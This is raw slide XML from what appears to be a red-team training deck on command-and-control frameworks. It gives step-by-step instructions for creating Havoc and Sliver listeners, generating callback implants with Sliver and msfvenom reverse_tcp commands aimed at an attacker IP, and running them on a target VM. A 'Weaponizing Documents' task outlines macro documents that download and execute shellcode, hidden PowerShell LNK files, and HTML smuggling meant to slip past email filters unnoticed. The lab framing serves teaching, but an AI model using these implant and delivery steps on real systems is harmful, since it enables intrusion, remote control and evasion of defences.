            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Create a new listener: Within the Havoc GUI, navigate to the Listeners section, click Add, and choose HTTP or HTTPS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Host: Your Kali machine's IP address.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Port: 80 (or 443 for HTTPS).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Other fields can typically be left at their default values。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42832129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52400"/>
            <a:ext cx="12192000" cy="6705600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Generate an implant (Demon):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Go to the Attack → Payload section in the GUI.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Select your newly created listener as the callback method.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Choose the target architecture (e.g., x64) and output format (e.g., exe).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click Generate and save the file. This Demon implant is your payload</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Wrapping Up:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>After generating the implant, transfer it to your target Windows VM and execute it. You should then see an interactive session appear in the dashboard of whichever C2 you chose.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2223786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marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Part 2 ○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Listener Configuration:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Set up an HTTP/HTTPS listener to receive incoming connections. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Step 1 Start an HTTP/HTTPS Listener</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>In the Sliver console:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http --lhost YOUR_KALI_IP --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lport</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 80</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(Replace YOUR_KALI_IP with your Kali machine's IP address)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>For HTTPS, use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>https --lhost YOUR_KALI_IP --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>lport</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 443</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Part 3   Generate a basic "Beacon" or "Implant" and execute it on a target VM to establish a persistent connection. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Step 1 :- Generate a Windows implant that calls back to your listener:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>generate --http YOUR_KALI_IP --save /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/sliver_implant.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This produces a single-binary implant with no external dependencies.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28394252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4017E5-BDD1-3946-A9E3-8968EA0CA951}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="11772900" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Step 2:- Execute on Target VM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Copy /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/sliver_implant.exe to your Windows VM and run it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Back on the Sliver console, you'll see a new session appear. Use:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>sessions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t># Interact with the session</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>use SESSION_ID</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Verification: On the target VM, you can verify the running implant by checking network connections with netstat -an or using Process Explorer to inspect the Sliver process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27108852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89560" y="0"/>
            <a:ext cx="10515600" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Task 02 Weaponizing Documents &amp; Payloads </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1111828"/>
            <a:ext cx="12192000" cy="5372100"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Description:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Create files that look innocent but execute your C2 implant when opened. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Technical Requirements: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Macro-Based Payloads:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Create a Microsoft Word or Excel document with a malicious </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Macro (VBA)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> that downloads and executes your shellcode. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>LNK Files:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Create a malicious </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Shortcut (.LNK)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> file that uses PowerShell to execute a hidden command in the background. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>HTML Smuggling:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Create an HTML file that "assembles" a malicious payload on the user's browser to bypass email gateway filters. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Learning Goal:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Learn how to deliver payloads through common business file formats without raising suspicion. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23186650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96982" y="124692"/>
            <a:ext cx="12095018" cy="6733308"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>Part 1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>Macro-Based Payloads:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>Create a Microsoft Word or Excel document with a malicious Macro (VBA) that downloads and executes your shellcode. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="361759"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🎯 Macro-Based Payloads (Weaponized Documents)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>A macro is a set of instructions embedded inside a document that can run automatically when the document is opened.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>🔹 What is VBA?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>VBA (Visual Basic for Applications) is the programming language used to create macros in Microsoft Office (Word, Excel, etc.).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>🔹 Why This Matters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>- Documents are trusted file types</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>- Macros can execute code automatically</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>- This makes them a common initial access vector</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="556953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077E99-54D4-DEE3-E809-DB6B73673132}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="530942" y="1342103"/>
            <a:ext cx="10822858" cy="4834860"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>🔹 Key Concept</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>A document can contain hidden code that runs when opened (if macros are enabled).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>🔹 What We Will Build</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>A macro-enabled document that:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>✔ Executes automatically on open</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>✔ Runs code inside the system</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>✔ Demonstrates how payload delivery works</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35743302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Autofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>1. Prepare your shellcode / implant on Kali</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Generate or place your implant (e.g., implant.exe or PowerShell script).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>🎯Generate the Core Payload</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>First, you use a C2 framework to create the raw payload. There are three primary ways to do this:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="2" name="Table 1"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2891231916"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1" y="1714500"/>
          <a:ext cx="12192000" cy="514350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650843541"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4064000">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3591842242"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4064000">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2796238286"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="482228">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Tool / Framework</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" b="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Command / Action</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" b="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Notes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3734699776"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1336009">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="1" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Metasploit (msfvenom)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="quote-cjk-patch"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>msfvenom -p windows/x64/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>meterpreter</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>reverse_tcp</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t> LHOST=&lt;attacker_ip&gt; LPORT=4444 -f exe -o implant.exe</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>This is the simplest method; pay attention to the output format (-f exe). Generate x64 payloads to match modern systems.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="136538693"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1336009">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="1" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Sliver C2</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="quote-cjk-patch"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>generate --http &lt;attacker_ip&gt; --save implant.exe</a:t>
                      </a:r>
                    </a:p>
